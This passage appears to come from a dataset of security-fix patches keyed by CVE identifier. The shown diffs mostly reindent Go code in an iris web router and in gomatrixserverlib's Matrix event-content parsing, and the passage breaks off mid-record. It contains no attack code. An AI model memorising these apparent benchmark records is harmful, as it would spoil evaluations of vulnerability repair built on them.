mvc.New(AuthScope.Party(\"/ippools/{name}/ips\")).HandleError(ErrorHandler).Handle(controller.NewIpController())\n+        mvc.New(AuthScope.Party(\"/projects/{project}/resources\")).HandleError(ErrorHandler).Handle(controller.NewProjectResourceController())\n+        mvc.New(AuthScope.Party(\"/projects/{project}/members\")).HandleError(ErrorHandler).Handle(controller.NewProjectMemberController())\n+        mvc.New(AuthScope.Party(\"/projects/{project}/clusters/{cluster}/members\")).HandleError(ErrorHandler).Handle(controller.NewClusterMemberController())\n+        mvc.New(AuthScope.Party(\"/projects/{project}/clusters/{cluster}/resources\")).HandleError(ErrorHandler).Handle(controller.NewClusterResourceController())\n+        mvc.New(AuthScope.Party(\"/templates\")).HandleError(ErrorHandler).Handle(controller.NewTemplateConfigController())\n+        mvc.New(AuthScope.Party(\"/clusters/grade\")).HandleError(ErrorHandler).Handle(controller.NewGradeController())\n+        mvc.New(AuthScope.Party(\"/ldap\")).HandleError(ErrorHandler).Handle(controller.NewLdapController())\n+        mvc.New(AuthScope.Party(\"/msg/accounts\")).HandleError(ErrorHandler).Handle(controller.NewMessageAccountController())\n+        mvc.New(AuthScope.Party(\"/msg/subscribes\")).HandleError(ErrorHandler).Handle(controller.NewMessageSubscribeController())\n+        mvc.New(AuthScope.Party(\"/user/messages\")).HandleError(ErrorHandler).Handle(controller.NewUserMsgController())\n+        mvc.New(AuthScope.Party(\"/user/settings\")).HandleError(ErrorHandler).Handle(controller.NewUserSettingController())\n+        AuthScope.Get(\"/clusters/kubeconfig/{name}\", downloadKubeconfig)\n+        WhiteScope = v1.Party(\"/\")\n+        WhiteScope.Get(\"/captcha\", generateCaptcha)\n+        mvc.New(WhiteScope.Party(\"/theme\")).HandleError(ErrorHandler).Handle(controller.NewThemeController())\n \n }\n \n func ErrorHandler(ctx context.Context, err error) {\n-\tif err != nil {\n-\t\twarp := struct {\n-\t\t\tMsg string `json:\"msg\"`\n-\t\t}{err.Error()}\n-\t\tvar result string\n-\t\tswitch errType := err.(type) {\n-\t\tcase gorm.Errors:\n-\t\t\terrorSet := make(map[string]string)\n-\t\t\tfor _, er := range errType {\n-\t\t\t\ttr := ctx.Tr(er.Error())\n-\t\t\t\tif tr != \"\" {\n-\t\t\t\t\terrorMsg := tr\n-\t\t\t\t\terrorSet[er.Error()] = errorMsg\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tfor _, set := range errorSet {\n-\t\t\t\tresult = result + set + \" \"\n-\t\t\t}\n-\t\tcase error:\n-\t\t\tswitch errRoot := errors.Cause(err).(type) {\n-\t\t\tcase errorf.CErrFs:\n-\t\t\t\terrs := errRoot.Get()\n-\t\t\t\tfor _, er := range errs {\n-\t\t\t\t\targs := er.Args.([]interface{})\n-\t\t\t\t\ttr := ctx.Tr(er.Msg, args...)\n-\t\t\t\t\tif tr != \"\" {\n-\t\t\t\t\t\tresult = result + tr + \"\\n \"\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\tdefault:\n-\t\t\t\ttr := ctx.Tr(errors.Cause(err).Error())\n-\t\t\t\tif tr != \"\" {\n-\t\t\t\t\tresult = tr\n-\t\t\t\t} else {\n-\t\t\t\t\tresult = err.Error()\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\twarp.Msg = result\n-\t\tbf, _ := json.Marshal(&warp)\n-\t\tctx.StatusCode(http.StatusBadRequest)\n-\t\t_, _ = ctx.WriteString(string(bf))\n-\t\tctx.StopExecution()\n-\t\treturn\n-\t}\n+        if err != nil {\n+                warp := struct {\n+                        Msg string `json:\"msg\"`\n+                }{err.Error()}\n+                var result string\n+                switch errType := err.(type) {\n+                case gorm.Errors:\n+                        errorSet := make(map[string]string)\n+                        for _, er := range errType {\n+                                tr := ctx.Tr(er.Error())\n+                                if tr != \"\" {\n+                                        errorMsg := tr\n+                                        errorSet[er.Error()] = errorMsg\n+                                }\n+                        }\n+                        for _, set := range errorSet {\n+                                result = result + set + \" \"\n+                        }\n+                case error:\n+                        switch errRoot := errors.Cause(err).(type) {\n+                        case errorf.CErrFs:\n+                                errs := errRoot.Get()\n+                                for _, er := range errs {\n+                                        args := er.Args.([]interface{})\n+                                        tr := ctx.Tr(er.Msg, args...)\n+                                        if tr != \"\" {\n+                                                result = result + tr + \"\\n \"\n+                                        }\n+                                }\n+                        default:\n+                                tr := ctx.Tr(errors.Cause(err).Error())\n+                                if tr != \"\" {\n+                                        result = tr\n+                                } else {\n+                                        result = err.Error()\n+                                }\n+                        }\n+                }\n+                warp.Msg = result\n+                bf, _ := json.Marshal(&warp)\n+                ctx.StatusCode(http.StatusBadRequest)\n+                _, _ = ctx.WriteString(string(bf))\n+                ctx.StopExecution()\n+                return\n+        }\n }\n"}
{"cve":"CVE-2022-36009:0708", "fix_patch": "diff --git a/eventcontent.go b/eventcontent.go\nindex 5f9ba63..931dd2f 100644\n--- a/eventcontent.go\n+++ b/eventcontent.go\n@@ -16,293 +16,293 @@\n package gomatrixserverlib\n \n import (\n-\t\"database/sql/driver\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"strconv\"\n-\t\"strings\"\n+        \"database/sql/driver\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"strconv\"\n+        \"strings\"\n )\n \n // CreateContent is the JSON content of a m.room.create event along with\n // the top level keys needed for auth.\n // See https://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-create for descriptions of the fields.\n type CreateContent struct {\n-\t// We need the domain of the create event when checking federatability.\n-\tsenderDomain string\n-\t// We need the roomID to check that events are in the same room as the create event.\n-\troomID string\n-\t// We need the eventID to check the first join event in the room.\n-\teventID string\n-\t// The \"m.federate\" flag tells us whether the room can be federated to other servers.\n-\tFederate *bool `json:\"m.federate,omitempty\"`\n-\t// The creator of the room tells us what the default power levels are.\n-\tCreator string `json:\"creator\"`\n-\t// The version of the room. Should be treated as \"1\" when the key doesn't exist.\n-\tRoomVersion *RoomVersion `json:\"room_version,omitempty\"`\n-\t// The predecessor of the room.\n-\tPredecessor PreviousRoom `json:\"predecessor,omitempty\"`\n+        // We need the domain of the create event when checking federatability.\n+        senderDomain string\n+        // We need the roomID to check that events are in the same room as the create event.\n+        roomID string\n+        // We need the eventID to check the first join event in the room.\n+        eventID string\n+        // The \"m.federate\" flag tells us whether the room can be federated to other servers.\n+        Federate *bool `json:\"m.federate,omitempty\"`\n+        // The creator of the room tells us what the default power levels are.\n+        Creator string `json:\"creator\"`\n+        // The version of the room. Should be treated as \"1\" when the key doesn't exist.\n+        RoomVersion *RoomVersion `json:\"room_version,omitempty\"`\n+        // The predecessor of the room.\n+        Predecessor PreviousRoom `json:\"predecessor,omitempty\"`\n }\n \n // PreviousRoom is the \"Previous Room\" structure defined at https://matrix.org/docs/spec/client_server/r0.5.0#m-room-create\n type PreviousRoom struct {\n-\tRoomID  string `json:\"room_id\"`\n-\tEventID string `json:\"event_id\"`\n+        RoomID  string `json:\"room_id\"`\n+        EventID string `json:\"event_id\"`\n }\n \n // NewCreateContentFromAuthEvents loads the create event content from the create event in the\n // auth events.\n func NewCreateContentFromAuthEvents(authEvents AuthEventProvider) (c CreateContent, err error) {\n-\tvar createEvent *Event\n-\tif createEvent, err = authEvents.Create(); err != nil {\n-\t\treturn\n-\t}\n-\tif createEvent == nil {\n-\t\terr = errorf(\"missing create event\")\n-\t\treturn\n-\t}\n-\tif err = json.Unmarshal(createEvent.Content(), &c); err != nil {\n-\t\terr = errorf(\"unparsable create event content: %s\", err.Error())\n-\t\treturn\n-\t}\n-\tc.roomID = createEvent.RoomID()\n-\tc.eventID = createEvent.EventID()\n-\tif c.senderDomain, err = domainFromID(createEvent.Sender()); err != nil {\n-\t\treturn\n-\t}\n-\treturn\n+        var createEvent *Event\n+        if createEvent, err = authEvents.Create(); err != nil {\n+                return\n+        }\n+        if createEvent == nil {\n+                err = errorf(\"missing create event\")\n+                return\n+        }\n+        if err = json.Unmarshal(createEvent.Content(), &c); err != nil {\n+                err = errorf(\"unparsable create event content: %s\", err.Error())\n+                return\n+        }\n+        c.roomID = createEvent.RoomID()\n+        c.eventID = createEvent.EventID()\n+        if c.senderDomain, err = domainFromID(createEvent.Sender()); err != nil {\n+                return\n+        }\n+        return\n }\n \n // DomainAllowed checks whether the domain is allowed in the room by the\n // \"m.federate\" flag.\n func (c *CreateContent) DomainAllowed(domain string) error {\n-\tif domain == c.senderDomain {\n-\t\t// If the domain matches the domain of the create event then the event\n-\t\t// is always allowed regardless of the value of the \"m.federate\" flag.\n-\t\treturn nil\n-\t}\n-\tif c.Federate == nil || *c.Federate {\n-\t\t// The m.federate field defaults to true.\n-\t\t// If the domains are different then event is only allowed if the\n-\t\t// \"m.federate\" flag is absent or true.\n-\t\treturn nil\n-\t}\n-\treturn errorf(\"room is unfederatable\")\n+        if domain == c.senderDomain {\n+                // If the domain matches the domain of the create event then the event\n+                // is always allowed regardless of the value of the \"m.federate\" flag.\n+                return nil\n+        }\n+        if c.Federate == nil || *c.Federate {\n+                // The m.federate field defaults to true.\n+                // If the domains are different then event is only allowed if the\n+                // \"m.federate\" flag is absent or true.\n+                return nil\n+        }\n+        return errorf(\"room is unfederatable\")\n }\n \n // UserIDAllowed checks whether the domain part of the user ID is allowed in\n // the room by the \"m.federate\" flag.\n func (c *CreateContent) UserIDAllowed(id string) error {\n-\tdomain, err := domainFromID(id)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\treturn c.DomainAllowed(domain)\n+        domain, err := domainFromID(id)\n+        if err != nil {\n+                return err\n+        }\n+        return c.DomainAllowed(domain)\n }\n \n // domainFromID returns everything after the first \":\" character to extract\n // the domain part of a matrix ID.\n func domainFromID(id string) (string, error) {\n-\t// IDs have the format: SIGIL LOCALPART \":\" DOMAIN\n-\t// Split on the first \":\" character since the domain can contain \":\"\n-\t// characters.\n-\tparts := strings.SplitN(id, \":\", 2)\n-\tif len(parts) != 2 {\n-\t\t// The ID must have a \":\" character.\n-\t\treturn \"\", errorf(\"invalid ID: %q\", id)\n-\t}\n-\t// Return everything after the first \":\" character.\n-\treturn parts[1], nil\n+        // IDs have the format: SIGIL LOCALPART \":\" DOMAIN\n+        // Split on the first \":\" character since the domain can contain \":\"\n+        // characters.\n+        parts := strings.SplitN(id, \":\", 2)\n+        if len(parts) != 2 {\n+                // The ID must have a \":\" character.\n+                return \"\", errorf(\"invalid ID: %q\", id)\n+        }\n+        // Return everything after the first \":\" character.\n+        return parts[1], nil\n }\n \n // MemberContent is the JSON content of a m.room.member event needed for auth checks.\n // See https://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-member for descriptions of the fields.\n type MemberContent struct {\n-\t// We use the membership key in order to check if the user is in the room.\n-\tMembership  string `json:\"membership\"`\n-\tDisplayName string `json:\"displayname,omitempty\"`\n-\tAvatarURL   string `json:\"avatar_url,omitempty\"`\n-\tReason      string `json:\"reason,omitempty\"`\n-\tIsDirect    bool   `json:\"is_direct,omitempty\"`\n-\t// We use the third_party_invite key to special case thirdparty invites.\n-\tThirdPartyInvite *MemberThirdPartyInvite `json:\"third_party_invite,omitempty\"`\n-\t// Restricted join rules require a user with invite permission to be nominated,\n-\t// so that their membership can be included in the auth events.\n-\tAuthorisedVia string `json:\"join_authorised_via_users_server,omitempty\"`\n+        // We use the membership key in order to check if the user is in the room.\n+        Membership  string `json:\"membership\"`\n+        DisplayName string `json:\"displayname,omitempty\"`\n+        AvatarURL   string `json:\"avatar_url,omitempty\"`\n+        Reason      string `json:\"reason,omitempty\"`\n+        IsDirect    bool   `json:\"is_direct,omitempty\"`\n+        // We use the third_party_invite key to special case thirdparty invites.\n+        ThirdPartyInvite *MemberThirdPartyInvite `json:\"third_party_invite,omitempty\"`\n+        // Restricted join rules require a user with invite permission to be nominated,\n+        // so that their membership can be included in the auth events.\n+        AuthorisedVia string `json:\"join_authorised_via_users_server,omitempty\"`\n }\n \n // MemberThirdPartyInvite is the \"Invite\" structure defined at http://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-member\n type MemberThirdPartyInvite struct {\n-\tDisplayName string                       `json:\"display_name\"`\n-\tSigned      MemberThirdPartyInviteSigned `json:\"signed\"`\n+        DisplayName string                       `json:\"display_name\"`\n+        Signed      MemberThirdPartyInviteSigned `json:\"signed\"`\n }\n \n // MemberThirdPartyInviteSigned is the \"signed\" structure defined at http://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-member\n type MemberThirdPartyInviteSigned struct {\n-\tMXID       string                       `json:\"mxid\"`\n-\tSignatures map[string]map[string]string `json:\"signatures\"`\n-\tToken      string                       `json:\"token\"`\n+        MXID       string                       `json:\"mxid\"`\n+        Signatures map[string]map[string]string `json:\"signatures\"`\n+        Token      string                       `json:\"token\"`\n }\n \n // NewMemberContentFromAuthEvents loads the member content from the member event for the user ID in the auth events.\n // Returns an error if there was an error loading the member event or parsing the event content.\n func NewMemberContentFromAuthEvents(authEvents AuthEventProvider, userID string) (c MemberContent, err error) {\n-\tvar memberEvent *Event\n-\tif memberEvent, err = authEvents.Member(userID); err != nil {\n-\t\treturn\n-\t}\n-\tif memberEvent == nil {\n-\t\t// If there isn't a member event then the membership for the user\n-\t\t// defaults to leave.\n-\t\tc.Membership = Leave\n-\t\treturn\n-\t}\n-\treturn NewMemberContentFromEvent(memberEvent)\n+        var memberEvent *Event\n+        if memberEvent, err = authEvents.Member(userID); err != nil {\n+                return\n+        }\n+        if memberEvent == nil {\n+                // If there isn't a member event then the membership for the user\n+                // defaults to leave.\n+                c.Membership = Leave\n+                return\n+        }\n+        return NewMemberContentFromEvent(memberEvent)\n }\n \n // NewMemberContentFromEvent parse the member content from an event.\n // Returns an error if the content couldn't be parsed.\n func NewMemberContentFromEvent(event *Event) (c MemberContent, err error) {\n-\tif err = json.Unmarshal(event.Content(), &c); err != nil {\n-\t\tvar partial membershipContent\n-\t\tif err = json.Unmarshal(event.Content(), &partial); err != nil {\n-\t\t\terr = errorf(\"unparsable member event content: %s\", err.Error())\n-\t\t\treturn\n-\t\t}\n-\t\tc.Membership = partial.Membership\n-\t\tc.ThirdPartyInvite = partial.ThirdPartyInvite\n-\t}\n-\treturn\n+        if err = json.Unmarshal(event.Content(), &c); err != nil {\n+                var partial membershipContent\n+                if err = json.Unmarshal(event.Content(), &partial); err != nil {\n+                        err = errorf(\"unparsable member event content: %s\", err.Error())\n+                        return\n+                }\n+                c.Membership = partial.Membership\n+                c.ThirdPartyInvite = partial.ThirdPartyInvite\n+        }\n+        return\n }\n \n // ThirdPartyInviteContent is the JSON content of a m.room.third_party_invite event needed for auth checks.\n // See https://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-third-party-invite for descriptions of the fields.\n type ThirdPartyInviteContent struct {\n-\tDisplayName    string `json:\"display_name\"`\n-\tKeyValidityURL string `json:\"key_validity_url\"`\n-\tPublicKey      string `json:\"public_key\"`\n-\t// Public keys are used to verify the signature of a m.room.member event that\n-\t// came from a m.room.third_party_invite event\n-\tPublicKeys []PublicKey `json:\"public_keys\"`\n+        DisplayName    string `json:\"display_name\"`\n+        KeyValidityURL string `json:\"key_validity_url\"`\n+        PublicKey      string `json:\"public_key\"`\n+        // Public keys are used to verify the signature of a m.room.member event that\n+        // came from a m.room.third_party_invite event\n+        PublicKeys []PublicKey `json:\"public_keys\"`\n }\n \n // PublicKey is the \"PublicKeys\" structure defined at https://matrix.org/docs/spec/client_server/r0.5.0#m-room-third-party-invite\n type PublicKey struct {\n-\tPublicKey      Base64Bytes `json:\"public_key\"`\n-\tKeyValidityURL string      `json:\"key_validity_url\"`\n+        PublicKey      Base64Bytes `json:\"public_key\"`\n+        KeyValidityURL string      `json:\"key_validity_url\"`\n }\n \n // NewThirdPartyInviteContentFromAuthEvents loads the third party invite content from the third party invite event for the state key (token) in the auth events.\n // Returns an error if there was an error loading the third party invite event or parsing the event content.\n func NewThirdPartyInviteContentFromAuthEvents(authEvents AuthEventProvider, token string) (t ThirdPartyInviteContent, err error) {\n-\tvar thirdPartyInviteEvent *Event\n-\tif thirdPartyInviteEvent, err = authEvents.ThirdPartyInvite(token); err != nil {\n-\t\treturn\n-\t}\n-\tif thirdPartyInviteEvent == nil {\n-\t\t// If there isn't a third_party_invite event, then we return with an error\n-\t\terr = errorf(\"Couldn't find third party invite event\")\n-\t\treturn\n-\t}\n-\tif err = json.Unmarshal(thirdPartyInviteEvent.Content(), &t); err != nil {\n-\t\terr = errorf(\"unparsable third party invite event content: %s\", err.Error())\n-\t}\n-\treturn\n+        var thirdPartyInviteEvent *Event\n+        if thirdPartyInviteEvent, err = authEvents.ThirdPartyInvite(token); err != nil {\n+                return\n+        }\n+        if thirdPartyInviteEvent == nil {\n+                // If there isn't a third_party_invite event, then we return with an error\n+                err = errorf(\"Couldn't find third party invite event\")\n+                return\n+        }\n+        if err = json.Unmarshal(thirdPartyInviteEvent.Content(), &t); err != nil {\n+                err = errorf(\"unparsable third party invite event content: %s\", err.Error())\n+        }\n+        return\n }\n \n // HistoryVisibilityContent is the JSON content of a m.room.history_visibility event.\n // See https://matrix.org/docs/spec/client_server/r0.6.0#room-history-visibility for descriptions of the fields.\n type HistoryVisibilityContent struct {\n-\tHistoryVisibility HistoryVisibility `json:\"history_visibility\"`\n+        HistoryVisibility HistoryVisibility `json:\"history_visibility\"`\n }\n \n type HistoryVisibility string\n \n const (\n-\tHistoryVisibilityWorldReadable HistoryVisibility = \"world_readable\"\n-\tHistoryVisibilityShared        HistoryVisibility = \"shared\"\n-\tHistoryVisibilityInvited       HistoryVisibility = \"invited\"\n-\tHistoryVisibilityJoined        HistoryVisibility = \"joined\"\n+        HistoryVisibilityWorldReadable HistoryVisibility = \"world_readable\"\n+        HistoryVisibilityShared        HistoryVisibility = \"shared\"\n+        HistoryVisibilityInvited       HistoryVisibility = \"invited\"\n+        HistoryVisibilityJoined        HistoryVisibility = \"joined\"\n )\n \n // Scan implements sql.Scanner\n func (h *HistoryVisibility) Scan(src interface{}) error {\n-\tswitch v := src.(type) {\n-\tcase int64:\n-\t\ts, ok := hisVisIntToStringMapping[uint8(v)]\n-\t\tif !ok { // history visibility is unknown, default to shared\n-\t\t\t*h = HistoryVisibilityShared\n-\t\t\treturn nil\n-\t\t}\n-\t\t*h = s\n-\t\treturn nil\n-\tcase float64:\n-\t\ts, ok := hisVisIntToStringMapping[uint8(v)]\n-\t\tif !ok { // history visibility is unknown, default to shared\n-\t\t\t*h = HistoryVisibilityShared\n-\t\t\treturn nil\n-\t\t}\n-\t\t*h = s\n-\t\treturn nil\n-\tdefault:\n-\t\treturn fmt.Errorf(\"unknown source type: %T for HistoryVisibilty\", src)\n-\t}\n+        switch v := src.(type) {\n+        case int64:\n+                s, ok := hisVisIntToStringMapping[uint8(v)]\n+                if !ok { // history visibility is unknown, default to shared\n+                        *h = HistoryVisibilityShared\n+                        return nil\n+                }\n+                *h = s\n+                return nil\n+        case float64:\n+                s, ok := hisVisIntToStringMapping[uint8(v)]\n+                if !ok { // history visibility is unknown, default to shared\n+                        *h = HistoryVisibilityShared\n+                        return nil\n+                }\n+                *h = s\n+                return nil\n+        default:\n+                return fmt.Errorf(\"unknown source type: %T for HistoryVisibilty\", src)\n+        }\n }\n \n // Value implements sql.Valuer\n func (h HistoryVisibility) Value() (driver.Value, error) {\n-\tv, ok := hisVisStringToIntMapping[h]\n-\tif !ok {\n-\t\treturn int64(hisVisStringToIntMapping[HistoryVisibilityShared]), nil\n-\t}\n-\treturn int64(v), nil\n+        v, ok := hisVisStringToIntMapping[h]\n+        if !ok {\n+                return int64(hisVisStringToIntMapping[HistoryVisibilityShared]), nil\n+        }\n+        return int64(v), nil\n }\n \n var hisVisStringToIntMapping = map[HistoryVisibility]uint8{\n-\tHistoryVisibilityWorldReadable: 1, // Starting at 1, to avoid confusions with Go default values\n-\tHistoryVisibilityShared:        2,\n-\tHistoryVisibilityInvited:       3,\n-\tHistoryVisibilityJoined:        4,\n+        HistoryVisibilityWorldReadable: 1, // Starting at 1, to avoid confusions with Go default values\n+        HistoryVisibilityShared:        2,\n+        HistoryVisibilityInvited:       3,\n+        HistoryVisibilityJoined:        4,\n }\n \n var hisVisIntToStringMapping = map[uint8]HistoryVisibility{\n-\t1: HistoryVisibilityWorldReadable, // Starting at 1, to avoid confusions with Go default values\n-\t2: HistoryVisibilityShared,\n-\t3: HistoryVisibilityInvited,\n-\t4: HistoryVisibilityJoined,\n+        1: HistoryVisibilityWorldReadable, // Starting at 1, to avoid confusions with Go default values\n+        2: HistoryVisibilityShared,\n+        3: HistoryVisibilityInvited,\n+        4: HistoryVisibilityJoined,\n }\n \n // JoinRuleContent is the JSON content of a m.room.join_rules event needed for auth checks.\n // See  https://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-join-rules for descriptions of the fields.\n type JoinRuleContent struct {\n-\t// We use the join_rule key to check whether join m.room.member events are allowed.\n-\tJoinRule string                     `json:\"join_rule\"`\n-\tAllow    []JoinRuleContentAllowRule `json:\"allow,omitempty\"`\n+        // We use the join_rule key to check whether join m.room.member events are allowed.\n+        JoinRule string                     `json:\"join_rule\"`\n+        Allow    []JoinRuleContentAllowRule `json:\"allow,omitempty\"`\n }\n \n type JoinRuleContentAllowRule struct {\n-\tType   string `json:\"type\"`\n-\tRoomID string `json:\"room_id\"`\n+        Type   string `json:\"type\"`\n+        RoomID string `json:\"room_id\"`\n }\n \n // NewJoinRuleContentFromAuthEvents loads the join rule content from the join rules event in the auth event.\n // Returns an error if there was an error loading the join rule event or parsing the content.\n func NewJoinRuleContentFromAuthEvents(authEvents AuthEventProvider) (c JoinRuleContent, err error) {\n-\t// Start off with \"invite\" as the default. Hopefully the unmarshal\n-\t// step later will replace it with a better value.\n-\tc.JoinRule = Invite\n-\t// Then see if the specified join event contains something better.\n-\tjoinRulesEvent, err := authEvents.JoinRules()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tif joinRulesEvent == nil {\n-\t\treturn\n-\t}\n-\tif err = json.Unmarshal(joinRulesEvent.Content(), &c); err != nil {\n-\t\terr = errorf(\"unparsable join_rules event content: %s\", err.Error())\n-\t\treturn\n-\t}\n-\treturn\n+        // Start off with \"invite\" as the default. Hopefully the unmarshal\n+        // step later will replace it with a better value.\n+        c.JoinRule = Invite\n+        // Then see if the specified join event contains something better.\n+        joinRulesEvent, err := authEvents.JoinRules()\n+        if err != nil {\n+                return\n+        }\n+        if joinRulesEvent == nil {\n+                return\n+        }\n+        if err = json.Unmarshal(joinRulesEvent.Content(), &c); err != nil {\n+                err = errorf(\"unparsable join_rules event content: %s\", err.Error())\n+                return\n+        }\n+        return\n }\n \n // PowerLevelContent is the JSON content of a m.room.power_levels event needed for auth checks.\n@@ -312,213 +312,213 @@ func NewJoinRuleContentFromAuthEvents(authEvents AuthEventProvider) (c JoinRuleC\n // the struct into JSON easily.\n // See https://matrix.org/docs/spec/client_server/r0.2.0.html#m-room-power-levels for descriptions of the fields.\n type PowerLevelContent struct {\n-\tBan           int64            `json:\"ban\"`\n-\tInvite        int64            `json:\"invite\"`\n-\tKick          int64            `json:\"kick\"`\n-\tRedact        int64            `json:\"redact\"`\n-\tUsers         map[string]int64 `json:\"users\"`\n-\tUsersDefault  int64            `json:\"users_default\"`\n-\tEvents        map[string]int64 `json:\"events\"`\n-\tEventsDefault int64            `json:\"events_default\"`\n-\tStateDefault  int64            `json:\"state_default\"`\n-\tNotifications map[string]int64 `json:\"notifications\"`\n+        Ban           int64            `json:\"ban\"`\n+        Invite        int64            `json:\"invite\"`\n+        Kick          int64            `json:\"kick\"`\n+        Redact        int64            `json:\"redact\"`\n+        Users         map[string]int64 `json:\"users\"`\n+        UsersDefault  int64            `json:\"users_default\"`\n+        Events        map[string]int64 `json:\"events\"`\n+        EventsDefault int64            `json:\"events_default\"`\n+        StateDefault  int64            `json:\"state_default\"`\n+        Notifications map[string]int64 `json:\"notifications\"`\n }\n \n // UserLevel returns the power level a user has in the room.\n func (c *PowerLevelContent) UserLevel(userID string) int64 {\n-\tlevel, ok := c.Users[userID]\n-\tif ok {\n-\t\treturn level\n-\t}\n-\treturn c.UsersDefault\n+        level, ok := c.Users[userID]\n+        if ok {\n+                return level\n+        }\n+        return c.UsersDefault\n }\n \n // EventLevel returns the power level needed to send an event in the room.\n func (c *PowerLevelContent) EventLevel(eventType string, isState bool) int64 {\n-\tif eventType == MRoomThirdPartyInvite {\n-\t\t// Special case third_party_invite events to have the same level as\n-\t\t// m.room.member invite events.\n-\t\t// https://github.com/matrix-org/synapse/blob/v0.18.5/synapse/api/auth.py#L182\n-\t\treturn c.Invite\n-\t}\n-\tlevel, ok := c.Events[eventType]\n-\tif ok {\n-\t\treturn level\n-\t}\n-\tif isState {\n-\t\treturn c.StateDefault\n-\t}\n-\treturn c.EventsDefault\n+        if eventType == MRoomThirdPartyInvite {\n+                // Special case third_party_invite events to have the same level as\n+                // m.room.member invite events.\n+                // https://github.com/matrix-org/synapse/blob/v0.18.5/synapse/api/auth.py#L182\n+                return c.Invite\n+        }\n+        level, ok := c.Events[eventType]\n+        if ok {\n+                return level\n+        }\n+        if isState {\n+                return c.StateDefault\n+        }\n+        return c.EventsDefault\n }\n \n // UserLevel returns the power level a user has in the room.\n func (c *PowerLevelContent) NotificationLevel(notification string) int64 {\n-\tlevel, ok := c.Notifications[notification]\n-\tif ok {\n-\t\treturn level\n-\t}\n-\t// https://matrix.org/docs/spec/client_server/r0.6.1#m-room-power-levels\n-\t// room\tinteger\tThe level required to trigger an @room notification. Defaults to 50 if unspecified.\n-\treturn 50\n+        level, ok := c.Notifications[notification]\n+        if ok {\n+                return level\n+        }\n+        // https://matrix.org/docs/spec/client_server/r0.6.1#m-room-power-levels\n+        // room integer The level required to trigger an @room notification. Defaults to 50 if unspecified.\n+        return 50\n }\n \n // NewPowerLevelContentFromAuthEvents loads the power level content from the\n // power level event in the auth events or returns the default values if there\n // is no power level event.\n func NewPowerLevelContentFromAuthEvents(authEvents AuthEventProvider, creatorUserID string) (c PowerLevelContent, err error) {\n-\tpowerLevelsEvent, err := authEvents.PowerLevels()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tif powerLevelsEvent != nil {\n-\t\treturn NewPowerLevelContentFromEvent(powerLevelsEvent)\n-\t}\n-\n-\t// If there are no power levels then fall back to defaults.\n-\tc.Defaults()\n-\t// If there is no power level event then the creator gets level 100\n-\t// https://github.com/matrix-org/synapse/blob/v0.18.5/synapse/api/auth.py#L569\n-\t// If we want users to be able to set PLs > 100 with power_level_content_override\n-\t// then we need to set the upper bound: maximum allowable JSON value is (2^53)-1.\n-\tc.Users = map[string]int64{creatorUserID: 9007199254740991}\n-\t// If there is no power level event then the state_default is level 50\n-\t// https://github.com/matrix-org/synapse/blob/v1.38.0/synapse/event_auth.py#L437\n-\t// Previously it was 0, but this was changed in:\n-\t// https://github.com/matrix-org/synapse/commit/5c9afd6f80cf04367fe9b02c396af9f85e02a611\n-\tc.StateDefault = 50\n-\treturn\n+        powerLevelsEvent, err := authEvents.PowerLevels()\n+        if err != nil {\n+                return\n+        }\n+        if powerLevelsEvent != nil {\n+                return NewPowerLevelContentFromEvent(powerLevelsEvent)\n+        }\n+\n+        // If there are no power levels then fall back to defaults.\n+        c.Defaults()\n+        // If there is no power level event then the creator gets level 100\n+        // https://github.com/matrix-org/synapse/blob/v0.18.5/synapse/api/auth.py#L569\n+        // If we want users to be able to set PLs > 100 with power_level_content_override\n+        // then we need to set the upper bound: maximum allowable JSON value is (2^53)-1.\n+        c.Users = map[string]int64{creatorUserID: 9007199254740991}\n+        // If there is no power level event then the state_default is level 50\n+        // https://github.com/matrix-org/synapse/blob/v1.38.0/synapse/event_auth.py#L437\n+        // Previously it was 0, but this was changed in:\n+        // https://github.com/matrix-org/synapse/commit/5c9afd6f80cf04367fe9b02c396af9f85e02a611\n+        c.StateDefault = 50\n+        return\n }\n \n // Defaults sets the power levels to their default values.\n // See https://spec.matrix.org/v1.1/client-server-api/#mroompower_levels for defaults.\n func (c *PowerLevelContent) Defaults() {\n-\tc.Invite = 50\n-\tc.Ban = 50\n-\tc.Kick = 50\n-\tc.Redact = 50\n-\tc.UsersDefault = 0\n-\tc.EventsDefault = 0\n-\tc.StateDefault = 50\n-\tc.Notifications = map[string]int64{\n-\t\t\"room\": 50,\n-\t}\n+        c.Invite = 50\n+        c.Ban = 50\n+        c.Kick = 50\n+        c.Redact = 50\n+        c.UsersDefault = 0\n+        c.EventsDefault = 0\n+        c.StateDefault = 50\n+        c.Notifications = map[string]int64{\n+                \"room\": 50,\n+        }\n }\n \n // NewPowerLevelContentFromEvent loads the power level content from an event.\n func NewPowerLevelContentFromEvent(event *Event) (c PowerLevelContent, err error) {\n-\t// Set the levels to their default values.\n-\tc.Defaults()\n-\n-\tvar strict bool\n-\tif strict, err = event.roomVersion.RequireIntegerPowerLevels(); err != nil {\n-\t\treturn\n-\t} else if strict {\n-\t\t// Unmarshal directly to PowerLevelContent, since that will kick up an\n-\t\t// error if one of the power levels isn't an int64.\n-\t\tif err = json.Unmarshal(event.Content(), &c); err != nil {\n-\t\t\terr = errorf(\"unparsable power_levels event content: %s\", err.Error())\n-\t\t\treturn\n-\t\t}\n-\t} else {\n-\t\t// We can't extract the JSON directly to the powerLevelContent because we\n-\t\t// need to convert string values to int values.\n-\t\tvar content struct {\n-\t\t\tInviteLevel        levelJSONValue            `json:\"invite\"`\n-\t\t\tBanLevel           levelJSONValue            `json:\"ban\"`\n-\t\t\tKickLevel          levelJSONValue            `json:\"kick\"`\n-\t\t\tRedactLevel        levelJSONValue            `json:\"redact\"`\n-\t\t\tUserLevels         map[string]levelJSONValue `json:\"users\"`\n-\t\t\tUsersDefaultLevel  levelJSONValue            `json:\"users_default\"`\n-\t\t\tEventLevels        map[string]levelJSONValue 